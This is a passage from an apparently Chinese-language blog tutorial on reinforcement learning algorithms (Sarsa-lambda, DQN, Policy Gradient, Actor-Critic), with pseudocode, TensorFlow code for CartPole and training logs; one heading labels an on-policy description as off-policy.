31[!] Failed... Episode 4: total_steps = 45[+] Success! Episode 5: total_steps = 84[!] Failed... Episode 6: total_steps = 73[+] Success! Episode 7: total_steps = 36[+] Success! Episode 8: total_steps = 82[+] Success! Episode 9: total_steps = 33[+] Success! Episode 10: total_steps = 48[+] Success! Episode 11: total_steps = 61[+] Success! Episode 12: total_steps = 8[+] Success! Episode 13: total_steps = 8[+] Success! Episode 14: total_steps = 6[+] Success! Episode 15: total_steps = 6[+] Success! Episode 16: total_steps = 6[+] Success! Episode 17: total_steps = 11[!] Failed... Episode 18: total_steps = 6[+] Success! Episode 19: total_steps = 7[+] Success! Episode 20: total_steps = 6[+] Success! Episode 21: total_steps = 6[+] Success! Episode 22: total_steps = 6[+] Success! Episode 23: total_steps = 8[+] Success! Episode 24: total_steps = 6[+] Success! Episode 25: total_steps = 6[+] Success! Episode 26: total_steps = 6[+] Success! Episode 27: total_steps = 6[+] Success! Episode 28: total_steps = 6...</code></pre><h2 id="Off-policy-1"><a href="#Off-policy-1" class="headerlink" title="Off-policy"></a>Off-policy</h2><p>生成样本的 Policy（Value Function）跟网络更新参数时使用的 Policy（Value Function）相同。典型为 SARAS 算法，基于当前的 Policy 直接执行一次动作选择，然后用这个样本更新当前的 Policy。</p><p>该方法会遭遇探索-利用的矛盾，光利用目前已知的最优选择，可能学不到最优解，收敛到局部最优，而加入探索又降低了学习效率。epsilon-greedy 算法是这种矛盾下的折衷。优点是直接了当，速度快，劣势是不一定找到最优策略。</p><h2 id="Sarsa-lambda"><a href="#Sarsa-lambda" class="headerlink" title="Sarsa-lambda"></a><a href="https://blog.csdn.net/u010089444/article/details/80516345" target="_blank" rel="noopener">Sarsa-lambda</a></h2><p>Sarsa-lambda 算法是 Sarsa 的改进版。在每次获得 Reward 后，Sarsa 只对前一步的 Q 值进行更新，Sarsa-lambda 则会对获得 Reward 之前所有的 Q 值进行更新。</p><p>$$<br>\begin{array}{l}<br>Initialize\ Q(s,a)\ arbitrarily,for\ all\ s\in S,a\in A(s)\\<br>Repeat\ (for\ each\ episode):\\<br>\quad E(s,a)=0,for\ all\ s\in S,a\in A(s)\\<br>\quad Initialize\ S,A\\<br>\quad Repeat\ (for\ each\ step\ of\ episode):\\<br>\quad\quad Choose\ A’\ from\ S’\ using\ policy\ derived\ from\ Q\ (e.g.,\varepsilon-greedy)\\<br>\quad\quad \delta\leftarrow R+\gamma Q(S’,A’)-Q(S,A)\\<br>\quad\quad E(S,A)\leftarrow E(S,A)+1\\<br>\quad\quad For\ all\ s\in S,a\in A(s):\\<br>\quad\quad\quad Q(s,a)\leftarrow Q(s,a)+\alpha\delta E(s,a)\\<br>\quad\quad\quad E(s,a)\leftarrow \gamma\lambda E(s,a)\\<br>\quad\quad S\leftarrow S’;\ A\leftarrow A’;\\<br>\quad until\ S\ is\ terminal<br>\end{array}<br>$$</p><p>Sarsa-lambda 中新增了一个矩阵 Eligibility Trace，用于保存在路径中的每一步，这样就能更新前面的每一步的 Q 值。其中 $\lambda\in[0,1]$，如果 $\lambda=0$，就会退化为 Sarsa 算法；如果 $\lambda=1$，每次更新就会完全考虑到前面的每一步。</p><h3 id="Programming-2"><a href="#Programming-2" class="headerlink" title="Programming"></a>Programming</h3><p>对 Sarsa 进行一定的修改：</p><pre><code class="python">...class SarsaLambdaTable(RL):    def __init__(self, actions, learningRate=0.01, rewardDecay=0.9, greedyPolicy=0.9, traceDecay=0.9):        super(SarsaLambdaTable, self).__init__(actions, learningRate, rewardDecay, greedyPolicy)        self.lambda_ = traceDecay # 步数的衰减值        self.eligibilityTrace = self.qTable.copy() # 矩阵Eligibility Trace    def checkStateExists(self, state): # 检查状态State是否存在        if state not in self.qTable.index:            toBeAppend = pd.Series([0] * len(self.actions), index=self.qTable.columns, name=state) # 若不存在，新增一列            self.qTable = self.qTable.append(toBeAppend) # 更新Q表            self.eligibilityTrace = self.eligibilityTrace.append(toBeAppend) # 更新E表    def learn(self, s, a, r, s_, a_):        self.checkStateExists(s_)        qPred = self.qTable.loc[s, a] # 预测Q值        if s_ != &#39;terminated&#39;:            qTarget = r + self.gamma * self.qTable.loc[s_, a_] # 计算实际Q值        else:            qTarget = r        error = qTarget - qPred # 计算实际值和预测值的差值        # Method 1        #self.eligibilityTrace.loc[s, a] += 1        # Method 2        self.eligibilityTrace.loc[s, :] *= 0        self.eligibilityTrace.loc[s, a] = 1        self.qTable += self.lr * error * self.eligibilityTrace # 更新Q表        self.eligibilityTrace *= self.gamma * self.lambda_ # 更新E表def update():    for episode in range(100):        stepCounter = 0        observation = env.reset()        action = RL.chooseAction(str(observation))        while True:            env.render()            observation_, reward, isDone = env.step(action)            action_ = RL.chooseAction(str(observation_))            RL.learn(str(observation), action, reward, str(observation_), action_)            observation = observation_            action = action_            stepCounter += 1            if isDone:                break        if reward == 1:            print(&#39;[+] Success! Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter))        elif reward == -1:            print(&#39;[!] Failed... Episode %s: total_steps = %s&#39; % (episode + 1, stepCounter))    print(&#39;[*] Done&#39;)    env.destroy()...</code></pre><p>学习效果（收敛较慢）：</p><pre><code class="bash">$ ./Sarsa-lambda.py[!] Failed... Episode 1: total_steps = 6[!] Failed... Episode 2: total_steps = 27[!] Failed... Episode 3: total_steps = 43[+] Success! Episode 4: total_steps = 230[!] Failed... Episode 5: total_steps = 190[+] Success! Episode 6: total_steps = 40[+] Success! Episode 7: total_steps = 52[+] Success! Episode 8: total_steps = 155[+] Success! Episode 9: total_steps = 46[+] Success! Episode 10: total_steps = 44[+] Success! Episode 11: total_steps = 32[+] Success! Episode 12: total_steps = 21...[+] Success! Episode 64: total_steps = 8[+] Success! Episode 65: total_steps = 8[+] Success! Episode 66: total_steps = 6[+] Success! Episode 67: total_steps = 6...</code></pre><h1 id="Deep-Q-Network（DQN）"><a href="#Deep-Q-Network（DQN）" class="headerlink" title="Deep Q Network（DQN）"></a><a href="https://blog.csdn.net/qq_30615903/article/details/80744083" target="_blank" rel="noopener">Deep Q Network（DQN）</a></h1><p>由于在大量状态和行为的情况下，Q Learning 等一系列基于价值的算法不能很好地进行学习，衍生出了一种和神经网络结合的算法。</p><p>$$<br>\begin{array}{l}<br>Initialize\ replay\ memory\ D\ to\ capacity\ N\\<br>Initialize\ action-value\ function\ Q\ with\ random\ weights\ \theta\\<br>Initialize\ target\ action-value\ function\ \hat{Q}\ with\ weights\ \theta^-=\theta\\<br>For\ episode=1,M\ do\\<br>\quad Initialize\ sequence\ s_1={x_1}\ and\ preprocessed\ sequence\ \phi_1=\phi(s_1)\\<br>\quad For\ t=1,T\ do\\<br>\quad\quad With\ probability\ \varepsilon\ select\ a\ random\ action\ a_t\\<br>\quad\quad otherwise\ select\ a_t=argmax_aQ(\phi(s_t),a;\theta)\\<br>\quad\quad Execute\ action\ a_t\ in\ emulator\ and\ observe\ reward\ r_t\ and image\ x_{t+1}\\<br>\quad\quad Set\ s_{t+1}=s_t,a_t,x_{t+1}\ and\ preprocess\ \phi_{t+1}=\phi(s_{t+1})\\<br>\quad\quad Store\ transition\ (\phi_t,a_t,r_t,\phi_{t+1})\ in\ D\\<br>\quad\quad Sample\ random\ minibatch\ of\ transitions\ (\phi_j,a_j,r_j,\phi_{j+1})\ from\ D\\<br>\quad\quad Set\ y_j=\begin{cases}r_j, &amp; if\ episode\ terminates\ at\ step\ j+1\\ r_j+\gamma max_{a’}\hat{Q}(\phi_{j+1},a’;\phi^-), &amp; otherwise\end{cases}\\<br>\quad\quad Perform\ a\ gradient\ descent\ step\ on\ (y_j-Q(\phi(j),a_j;\theta))^2\ with\ respect\ to\ the\\<br>\quad\quad network\ paramters\ \theta\\<br>\quad\quad Every\ C\ steps\ reset\ \hat{Q}=Q\\<br>\quad End\ For\\<br>End\ For<br>\end{array}<br>$$</p><blockquote><p>PS：下面公式中的 $max_a$ 均表示 $max_{a’}$，不知道为什么 MathJax 不能正常显示下面带单引号的公式（在中括号 $[]$ 之间的部分）。有了解的师傅欢迎联系我。</p></blockquote><p>定义：</p><p>$$<br>Q^*=\max_{\pi}\mathbb{E}[\sum_{t=0}^{+\infty}\vert\gamma^tr_t\vert s_0=s,a_0=a,\pi]<br>$$</p><p>则有 Bellman Equation：</p><p>$$<br>Q^*(s,a)=\mathbb{E}_{s’\sim\varepsilon}[r+\gamma max_aQ^*(s’,a’)\vert s,a]<br>$$</p><p>用深度神经网络来模拟 $Q^*(s,a)$，其中 $\theta$ 为权重：</p><p>$$<br>Q(s,a;\theta)\approx Q^*(s,a)<br>$$</p><p>根据 Bellman Equation 得出以下神经网络：</p><ul><li>前向计算：$L_i(\theta_i)=\mathbb{E}_{s,a\sim\rho(\cdot)}[(y_i-Q(s,a;\theta_i))^2]$，其中 $y_i=\mathbb{E}_{s’\sim\epsilon}[r+\gamma max_aQ(s’,a’;\theta_{i-1})\vert s,a]$；</li><li>后向传播：$\nabla_{\theta_i}L_i(\theta_i)=\mathbb{E}_{s,a\sim\rho(\cdot);s’\sim\varepsilon}[r+\gamma max_aQ(s’,a’;\theta_{i-1})-Q(s,a;\theta_i)\nabla_{\theta_i}Q(s,a;\theta_i)]$。</li></ul><p>TODO</p><p><img src="/pics/Reinforcement-Learning/1.png" srcset="/img/loading.gif" alt></p><h2 id="Programming-3"><a href="#Programming-3" class="headerlink" title="Programming"></a>Programming</h2><p>利用 OpenAI 的 gym 库对 DQN 进行测试：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport pandas as pdimport tensorflow.compat.v1 as tftf.disable_v2_behavior()import gymimport matplotlib.pyplot as pltclass DeepQNetwork:    def __init__(self, nActions, nFeatures, learningRate=0.01, rewardDecay=0.9, eGreedy=0.9, replaceTargetIter=300, memorySize=500, batchSize=32, eGreedyIncrement=None, outputGraph=False):        self.nActions = nActions # 动作数        self.nFeatures = nFeatures # 神经网络的特征数        self.lr = learningRate # 学习率        self.gamma = rewardDecay # 奖励衰减项        self.epsilonMax = eGreedy # 贪婪系数最大值        self.replaceTargetIter = replaceTargetIter # 更新targetNet的步数        self.memorySize = memorySize # 用于记忆的数据数量        self.batchSize = batchSize # Batch大小        self.epsilonIncrement = eGreedyIncrement # 贪婪系数变化率        self.epsilon = 0 if eGreedyIncrement is not None else self.epsilonMax # 贪婪系数        self.learnStepCounter = 0 # 记录学习的步数        self.memory = np.zeros((self.memorySize, nFeatures * 2 + 2)) # 创建存储空间        self.buildNet() # 建立网络        tParams = tf.get_collection(&#39;targetNetParams&#39;) # 获取targetNet中的参数        eParams = tf.get_collection(&#39;evalNetParams&#39;) # 获取evalNet中的参数        self.replaceTargetOp = [tf.assign(t, e) for t, e in zip(tParams, eParams)] # 将targetNet中的参数替换为evalNet中的参数        self.sess = tf.Session()        if outputGraph:            tf.summary.FileWriter(&#39;log/&#39;, self.sess.graph)        self.sess.run(tf.global_variables_initializer()) # 激活变量        self.costHis = [] # 记录误差    def buildNet(self):        # Build evalNet        self.s = tf.placeholder(tf.float32, [None, self.nFeatures], name=&#39;s&#39;) # 输入1：当前的状态State        self.qTarget = tf.placeholder(tf.float32, [None, self.nActions], name=&#39;qTarget&#39;) # 输入2：现实Q值        with tf.variable_scope(&#39;evalNet&#39;):            cNames = [&#39;evalNetParams&#39;, tf.GraphKeys.GLOBAL_VARIABLES] # 用于收集evalNet中所有的参数            nL1 = 10 # 第一层神经元个数            wInitializer = tf.random_normal_initializer(0., 0.3) # 随机生成权重            bInitializer = tf.constant_initializer(0.1) # 随机生成偏置            with tf.variable_scope(&#39;l1&#39;): # 第一层                w1 = tf.get_variable(&#39;w1&#39;, [self.nFeatures, nL1], initializer=wInitializer, collections=cNames) # 权重                b1 = tf.get_variable(&#39;b1&#39;, [1, nL1], initializer=bInitializer, collections=cNames) # 偏置                l1 = tf.nn.relu(tf.matmul(self.s, w1) + b1) # 激励函数使用ReLU            with tf.variable_scope(&#39;l2&#39;): # 第二层                w2 = tf.get_variable(&#39;w2&#39;, [nL1, self.nActions], initializer=wInitializer, collections=cNames) # 权重                b2 = tf.get_variable(&#39;b2&#39;, [1, self.nActions], initializer=bInitializer, collections=cNames) # 偏置                self.qEval = tf.matmul(l1, w2) + b2 # 估计的Q值        with tf.variable_scope(&#39;loss&#39;):            self.loss = tf.reduce_mean(tf.squared_difference(self.qTarget, self.qEval))        with tf.variable_scope(&#39;train&#39;):            self.trainOp = tf.train.RMSPropOptimizer(self.lr).minimize(self.loss)        # Build targetNet        self.s_ = tf.placeholder(tf.float32, [None, self.nFeatures], name=&#39;s_&#39;) # 输入1：下一个状态State        with tf.variable_scope(&#39;targetNet&#39;):            cNames = [&#39;targetNetParams&#39;, tf.GraphKeys.GLOBAL_VARIABLES] # 用于收集targetNet中所有的参数            with tf.variable_scope(&#39;l1&#39;): # 第一层                w1 = tf.get_variable(&#39;w1&#39;, [self.nFeatures, nL1], initializer=wInitializer, collections=cNames) # 权重                b1 = tf.get_variable(&#39;b1&#39;, [1, nL1], initializer=bInitializer, collections=cNames) # 偏置                l1 = tf.nn.relu(tf.matmul(self.s_, w1) + b1) # 激励函数使用ReLU            with tf.variable_scope(&#39;l2&#39;): # 第二层                w2 = tf.get_variable(&#39;w2&#39;, [nL1, self.nActions], initializer=wInitializer, collections=cNames) # 权重                b2 = tf.get_variable(&#39;b2&#39;, [1, self.nActions], initializer=bInitializer, collections=cNames) # 偏置                self.qNext = tf.matmul(l1, w2) + b2 # 估计的Q值    def storeTransition(self, s, a, r, s_):        if not hasattr(self, &#39;memoryCounter&#39;):            self.memoryCounter = 0        transition = np.hstack((s, [a, r], s_))        idx = self.memoryCounter % self.memorySize        self.memory[idx, :] = transition        self.memoryCounter += 1    def chooseAction(self, observation): # 选择行为Action        observation = observation[np.newaxis, :] # 变成二维矩阵便于处理        if np.random.rand() &lt; self.epsilon:            actionsValue = self.sess.run(self.qEval, feed_dict={self.s: observation}) # 放入evalNet中分析计算行为的值            action = np.argmax(actionsValue) # 选择值最大的行为Action        else:            action = np.random.randint(0, self.nActions) # 10%的概率随机选择行为Action        return action    def learn(self):        if self.learnStepCounter % self.replaceTargetIter == 0: # 判断学习之前是否需要替换参数            self.sess.run(self.replaceTargetOp)            print(&#39;[+] Target params replaced.&#39;)        if self.memoryCounter &gt; self.memorySize: # 判断存储空间中的数据数量            sampleIdx = np.random.choice(self.memorySize, size=self.batchSize)        else:            sampleIdx = np.random.choice(self.memoryCounter, size=self.batchSize)        batchMemory = self.memory[sampleIdx, :] # 获取一部分数据作为Batch        qNext, qEval = self.sess.run([self.qNext, self.qEval], feed_dict={self.s_: batchMemory[:, -self.nFeatures:], self.s: batchMemory[:, :self.nFeatures]}) # 分别计算当前状态和下一状态的Q值        qTarget = qEval.copy() #        batchIdx = np.arange(self.batchSize, dtype=np.int32)        evalActIdx = batchMemory[:, self.nFeatures].astype(int)        reward = batchMemory[:, self.nFeatures + 1]        qTarget[batchIdx, evalActIdx] = reward + self.gamma * np.max(qNext, axis=1)        _, self.cost = self.sess.run([self.trainOp, self.loss], feed_dict={self.s: batchMemory[:, :self.nFeatures], self.qTarget: qTarget}) # 计算误差值        self.costHis.append(self.cost) # 存储误差值        self.epsilon = self.epsilon + self.epsilonIncrement if self.epsilon &lt; self.epsilonMax else self.epsilonMax # 更新贪婪系数        self.learnStepCounter += 1    def plotCost(self): # 展示误差        plt.plot(np.arange(len(self.costHis)), self.costHis)        plt.ylabel(&#39;Cost&#39;)        plt.xlabel(&#39;Training Steps&#39;)        plt.show()if __name__ == &#39;__main__&#39;:    env = gym.make(&#39;CartPole-v0&#39;)    print(env.action_space)    print(env.observation_space)    print(env.observation_space.high)    print(env.observation_space.low)    totalStep = 0    RL = DeepQNetwork(nActions=env.action_space.n, nFeatures=env.observation_space.shape[0], learningRate=0.01, eGreedy=0.9, replaceTargetIter=100, memorySize=2000, eGreedyIncrement=0.001)    for episode in range(100):        observation = env.reset() # 获取第一个状态        episodeReward = 0        while True:            env.render()            action = RL.chooseAction(observation) # 选择行为Actor            observation_, reward, isDone, info = env.step(action) # 获取执行行为后得到的相关信息            x, xDot, theta, thetaDot = observation_            r1 = (env.x_threshold - abs(x)) / env.x_threshold - 0.8 # 根据离画面中心距离判断奖励值            r2 = (env.theta_threshold_radians - abs(theta)) / env.theta_threshold_radians - 0.5 # 根据杆子偏离度判断奖励值            reward = r1 + r2 # 替换奖励值            RL.storeTransition(observation, action, reward, observation_) # 存储步骤            episodeReward += reward # 更新奖励值            if totalStep &gt; 1000:                RL.learn() # 学习            if isDone:                print(&#39;[+] episode: {}, episodeReward: {}, epsilon: {}&#39;.format(episode, episodeReward, RL.epsilon)) # 输出                break            observation = observation_            totalStep += 1    RL.plotCost() # 绘制误差图</code></pre><p>学习效果，最终会收敛到最合适的 $\varepsilon$ 对应的值：</p><pre><code class="bash">$ ./DQN.py...Discrete(2)Box(4,)[4.8000002e+00 3.4028235e+38 4.1887903e-01 3.4028235e+38][-4.8000002e+00 -3.4028235e+38 -4.1887903e-01 -3.4028235e+38]...[+] episode: 0, episodeReward: 8.962128355556148, epsilon: 0[+] episode: 1, episodeReward: 5.262074725675638, epsilon: 0[+] episode: 2, episodeReward: 4.771817696346831, epsilon: 0[+] episode: 3, episodeReward: 3.6815099553712423, epsilon: 0[+] episode: 4, episodeReward: 2.0117216279281562, epsilon: 0[+] episode: 5, episodeReward: 14.986124067404067, epsilon: 0[+] episode: 6, episodeReward: 5.049683281727361, epsilon: 0...[+] episode: 50, episodeReward: 7.6161165056296385, epsilon: 0[+] episode: 51, episodeReward: 7.366432746086161, epsilon: 0[+] Target params replaced.[+] episode: 52, episodeReward: 12.517630447631952, epsilon: 0.009000000000000001[+] episode: 53, episodeReward: 3.090222284801366, epsilon: 0.022000000000000013[+] episode: 54, episodeReward: 4.435946584693391, epsilon: 0.04300000000000003[+] episode: 55, episodeReward: 5.469698721962921, epsilon: 0.07000000000000005[+] episode: 56, episodeReward: 2.2975027875220384, epsilon: 0.08500000000000006[+] Target params replaced.[+] episode: 57, episodeReward: 3.042176076066822, epsilon: 0.10700000000000008[+] episode: 58, episodeReward: 18.75897216435803, epsilon: 0.1480000000000001...[+] Target params replaced.[+] episode: 97, episodeReward: 112.18733630622428, epsilon: 0.9[+] Target params replaced.[+] Target params replaced.[+] episode: 98, episodeReward: 126.81607918996532, epsilon: 0.9[+] Target params replaced.[+] Target params replaced.[+] episode: 99, episodeReward: 126.65358872838634, epsilon: 0.9</code></pre><p>误差趋势图：</p><p><img src="/pics/Reinforcement-Learning/2.png" srcset="/img/loading.gif" alt></p><h1 id="Policy-Gradience"><a href="#Policy-Gradience" class="headerlink" title="Policy Gradience"></a><a href="https://blog.csdn.net/qq_30615903/article/details/80747380" target="_blank" rel="noopener">Policy Gradience</a></h1><p>$$<br>\begin{array}{l}<br>Initialize\ \theta\ arbitrarily\\<br>For\ each\ episode\ {s_1,a_1,r_2,\cdots,s_{T-1},a_{T-1},r_T}\sim\pi do\\<br>\quad For\ t=1\ to\ T-1\ do\\<br>\quad\quad \theta\leftarrow+\alpha\nabla_\theta\log\pi_\theta(s_t,a_t)v_t\\<br>\quad End\ For\\<br>End\ For<br>\end{array}<br>$$</p><p>Policy Gradience 主要思想：在每一个状态下，根据现有 $P(a_t,s_t)$ 采样 $a_t$，如此往复，获得一组状态-行为对：$s_1,a_1,s_2,a_2,\cdots,s_T$，此时获得最终的奖励函数 $r_T$，这里我们假设 $r_T$ 可取正负值，其中正值表示获得奖励，负值表示获得惩罚。最终可以根据 $r_T$ 去修改每一步的 $P(a_t,s_t)$：</p><p>$$<br>P(a_t\vert s_t)=P(a_t\vert s_t)+\alpha r_T<br>$$</p><p>如果 $P(a_t\vert s_t)\sim Q(s_t,a_t,\theta)$，则有：</p><p>$$<br>\theta=\theta+\alpha r_t\nabla_\theta Q(s_t,a_t,\theta)<br>$$</p><p>Policy Gradience 的改进：上述算法的缺点是，我们需要非常精确地设置 $r_T$ 的值，否则很可能出现 $P$ 一直上涨或一直下降。一个主要的改进如下：</p><p>$$<br>\begin{array}{cc}<br>P(a_t\vert s_t)=P(a_t\vert s_t)+\alpha(r_T-V(s_t))\\<br>\theta=\theta+\alpha(r_T-V(s_t))\nabla_\theta Q(s_t,a_t,\theta)<br>\end{array}<br>$$</p><p>$V(s)$ 是估值函数：</p><p>$$<br>V(s)=\mathbb{E}[\sum_{t≥0}\gamma^tr_t\vert s_0=s,\pi]<br>$$</p><p>它代表了在 $t$ 时刻对最终 Reward 的估计（可以采用深度神经网络求 $V(s)=V(s,\theta)$）。</p><p><img src="/pics/Reinforcement-Learning/3.png" srcset="/img/loading.gif" alt></p><h2 id="Programming-4"><a href="#Programming-4" class="headerlink" title="Programming"></a>Programming</h2><p>利用 Policy Gradient 实现对 GYM 库中 CartPole 游戏的学习：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport pandas as pdimport tensorflow.compat.v1 as tftf.disable_v2_behavior()import gymimport matplotlib.pyplot as pltDISPLAY_REWARD_THRESHOLD = 400 # renders environment if total episode reward is greater then this thresholdRENDER = False # rendering wastes timeclass PolicyGradient:    def __init__(self, nActions, nFeatures, learningRate=0.01, rewardDecay=0.95, outputGraph=False):        self.nActions = nActions        self.nFeatures = nFeatures        self.lr = learningRate        self.gamma = rewardDecay        self.episodeObs, self.episodeAs, self.episodeRs = [], [], []        self.buildNet()        self.sess = tf.Session()        if outputGraph:            tf.summary.FileWriter(&#39;log/&#39;, self.sess.graph)            print(&#39;[+] TensorBoard built successfully&#39;)        self.sess.run(tf.global_variables_initializer())    def buildNet(self): # 建立神经网络        with tf.name_scope(&#39;inputs&#39;):            self.tfObs = tf.placeholder(tf.float32, [None, self.nFeatures], name=&#39;observations&#39;)            self.tfActs = tf.placeholder(tf.int32, [None], name=&#39;actionsNum&#39;)            self.tfVt = tf.placeholder(tf.float32, [None], name=&#39;actionsValue&#39;)        # fc1        layer = tf.layers.dense(inputs=self.tfObs, units=10, activation=tf.nn.tanh, kernel_initializer=tf.random_normal_initializer(mean=0, stddev=0.3), bias_initializer=tf.constant_initializer(0.1), name=&#39;fc1&#39;) # 全连接层        allAct = tf.layers.dense(inputs=layer, units=self.nActions, activation=None, kernel_initializer=tf.random_normal_initializer(mean=0, stddev=0.3), bias_initializer=tf.constant_initializer(0.1), name=&#39;fc2&#39;) # 全连接层        self.allActProb = tf.nn.softmax(allAct, name=&#39;actProb&#39;) # 求出行为对应的概率        with tf.name_scope(&#39;loss&#39;): # 计算误差            negLogProb = tf.nn.sparse_softmax_cross_entropy_with_logits(logits=allAct, labels=self.tfActs)            #negLogProb = tf.reduce_sum(-tf.log(self.allActProb) * tf.one_hot(self.tfActs, self.tfActs), axis=1) # 将目标函数修改为对最小值的求解            loss = tf.reduce_mean(negLogProb * self.tfVt)        with tf.name_scope(&#39;train&#39;):            self.trainOp = tf.train.AdamOptimizer(self.lr).minimize(loss)    def chooseAction(self, observation): # 选择行为        probWeights = self.sess.run(self.allActProb, feed_dict={self.tfObs: observation[np.newaxis, :]}) # 获取概率        action = np.random.choice(range(probWeights.shape[1]), p=probWeights.ravel()) # 通过概率选择行为        return action    def storeTransition(self, s, a, r): # 存储回合        self.episodeObs.append(s)        self.episodeAs.append(a)        self.episodeRs.append(r)    def learn(self): # 学习更新参数        discountedEpRsNorm = self.discountAndNormRewards()        self.sess.run(self.trainOp, feed_dict={self.tfObs: np.vstack(self.episodeObs), self.tfActs: np.array(self.episodeAs), self.tfVt: discountedEpRsNorm}) # 训练        self.episodeObs, self.episodeAs, self.episodeRs = [], [], [] # 清空存储空间        return discountedEpRsNorm    def discountAndNormRewards(self): # 衰减回合奖励        discountedEpRs = np.zeros_like(self.episodeRs)        runningAdd = 0        for t in reversed(range(len(self.episodeRs))):            runningAdd = runningAdd * self.gamma + self.episodeRs[t]            discountedEpRs[t] = runningAdd        # 数据归一化        discountedEpRs -= np.mean(discountedEpRs)        discountedEpRs /= np.std(discountedEpRs)        return discountedEpRsif __name__ == &#39;__main__&#39;:    env = gym.make(&#39;CartPole-v0&#39;)    env.seed(1) # reproducible, general Policy gradient has high variance    env = env.unwrapped    RL = PolicyGradient(nActions=env.action_space.n, nFeatures=env.observation_space.shape[0], learningRate=0.02, rewardDecay=0.99)    for episode in range(3000):        observation = env.reset()        while True:            if RENDER:                env.render()            action = RL.chooseAction(observation)            observation_, reward, isDone, info = env.step(action)            RL.storeTransition(observation, action, reward) # 存储当前回合            if isDone:                episodeRsSum = sum(RL.episodeRs)                if &#39;runningReward&#39; not in globals():                    runningReward = episodeRsSum                else:                    runningReward = runningReward * 0.99 + episodeRsSum * 0.01 # 更新奖励                if runningReward &gt; DISPLAY_REWARD_THRESHOLD: # 训练到一定程度                    RENDER = True                print(&#39;[+] episode: {}, reward: {}&#39;.format(episode, runningReward))                vt = RL.learn()                if episode == 0:                    plt.plot(vt) # 绘制回合奖励图                    plt.xlabel(&#39;Episode Steps&#39;)                    plt.ylabel(&#39;Normalized State-action value&#39;)                    plt.show()                break            observation = observation_</code></pre><p>学习效果：</p><pre><code class="bash">$ $ ./Policy-Gradient.py...[+] episode: 0, reward: 20.0[+] episode: 1, reward: 19.990000000000002[+] episode: 2, reward: 20.210100000000004[+] episode: 3, reward: 20.127999000000006[+] episode: 4, reward: 20.116719010000008[+] episode: 5, reward: 20.105551819900008[+] episode: 6, reward: 20.214496301701008[+] episode: 7, reward: 20.142351338683998...[+] episode: 107, reward: 332.15535489983097[+] episode: 108, reward: 341.05380135083266[+] episode: 109, reward: 388.9932633373243[+] episode: 110, reward: 390.75333070395106[+] episode: 111, reward: 446.6457973969116...</code></pre><p><img src="/pics/Reinforcement-Learning/4.png" srcset="/img/loading.gif" alt></p><h1 id="Actor-Critic（基于概率和价值）"><a href="#Actor-Critic（基于概率和价值）" class="headerlink" title="Actor-Critic（基于概率和价值）"></a><a href="https://blog.csdn.net/qq_30615903/article/details/80774384" target="_blank" rel="noopener">Actor-Critic（基于概率和价值）</a></h1><p>$$<br>\begin{array}{l}<br>Input:\ a\ differentiable\ policy\ parameterization\ \pi(a\vert s,\theta)\\<br>Input:\ a\ differentiable\ policy\ parameterization\ \hat{v}(s,\omega)\\<br>Algorithm\ parameters:\ trace-decay\ rates\ \gamma^\theta\in[0,1],\gamma^\omega\in[0,1];\ step\ sizes\ \alpha^\theta&gt;0,\alpha^\omega&gt;0\\<br>Initialize\ policy\ parameter\ \theta\in\mathbb{R}^{d’}\ and\ state-value\ weights\ \omega\in\mathbb{R}^d\ (e.g.,\ to\ 0)\\<br>Loop\ forever\ (for\ each\ episode):\\<br>\quad Initialize\ S\ (first\ state\ of\ episode)\\<br>\quad z^\theta\leftarrow0(d’-component\ eligibility\ trace\ vector)\\<br>\quad z^\omega\leftarrow0(d-component\ eligibility\ trace\ vector)\\<br>\quad I\leftarrow0\\<br>Loop\ while\ S\ is\ not\ terminal\ (for\ each\ time\ step):\\<br>\quad\quad A\sim\pi(\cdot\vert S,\theta)\\<br>\quad\quad Take\ action\ A,\ observe\ S’,R\\<br>\quad\quad \delta\leftarrow R+\gamma\hat{v}(S’,\omega)-\hat{v}(S,\omega)\\<br>\quad\quad z^\omega\leftarrow\gamma\lambda^\omega z^\omega+I\nabla_\omega\hat{v}(S,\omega)\\<br>\quad\quad z^\theta\leftarrow\gamma\lambda^\theta z^\theta+I\nabla_\theta\ln\pi(A\vert S,\theta) \\<br>\quad\quad \omega\leftarrow\omega+\alpha^\omega\delta z^\omega \\<br>\quad\quad \theta\leftarrow\theta+\alpha^\theta\delta z^\theta \\<br>\quad\quad I\leftarrow\gamma I \\<br>\quad\quad S\leftarrow S’ \\<br>\end{array}<br>$$</p><p>Actor-Critic 算法分为两部分，Actor 的前身是 Policy Gradient，可以在连续动作空间内选择合适的动作，由于 Actor 基于回合更新的所以学习效率比较慢；基于价值的 Q Learning 作为 Critic 的算法实现单步更新，对 Actor 的行为进行评分，Actor 再根据评分修改行为的概率。</p><h2 id="Shortcomings-1"><a href="#Shortcomings-1" class="headerlink" title="Shortcomings"></a>Shortcomings</h2><p>Actor 的行为取决于 Critic 的 Value，但因为 Critic 本身就很难收敛和 Actor 一起更新的话就更难收敛了。</p><h2 id="Programming-5"><a href="#Programming-5" class="headerlink" title="Programming"></a>Programming</h2><p>使用 Actor-Critic 算法对游戏 CartPole 进行学习：</p><pre><code class="python">#!/usr/bin/env python3import numpy as npimport tensorflow.compat.v1 as tftf.disable_v2_behavior()import gymOUTPUT_GRAPH = FalseMAX_EPISODE = 3000DISPLAY_REWARD_THRESHOLD = 200MAX_EP_STEPS = 1000RENDER = FalseGAMMA = 0.9 # 贪婪系数LR_A = 0.001 # Learning Rate of ActorLR_C = 0.01 # Learning Rate of Criticclass Actor(object):    def __init__(self, sess, nFeatures, nActions, lr=0.001):        self.sess = sess        self.s = tf.placeholder(tf.float32, [1, nFeatures], &#39;state&#39;) # 输入1：状态        self.a = tf.placeholder(tf.int32, None, &#39;act&#39;) # 输入2：动作        self.tdError = tf.placeholder(tf.float32, None, &#39;tdError&#39;) # 输入3：奖励        with tf.variable_scope(&#39;Actor&#39;):            l1 = tf.layers.dense(inputs=self.s, units=20, activation=tf.nn.relu, kernel_initializer=tf.random_normal_initializer(0., .1), bias_initializer=tf.constant_initializer(0.1), name=&#39;l1&#39;) # 第一层            self.actsProb = tf.layers.dense(inputs=l1, units=nActions, activation=tf.nn.softmax, kernel_initializer=tf.random_normal_initializer(0., .1), bias_initializer=tf.constant_initializer(0.1), name=&#39;actsProb&#39;) # 第二层输出每个动作的概率        with tf.variable_scope(&#39;expV&#39;):            logProb = tf.log(self.actsProb[0, self.a])            self.expV = tf.reduce_mean(logProb * self.tdError) # loss        with tf.variable_scope(&#39;train&#39;):            self.trainOp = 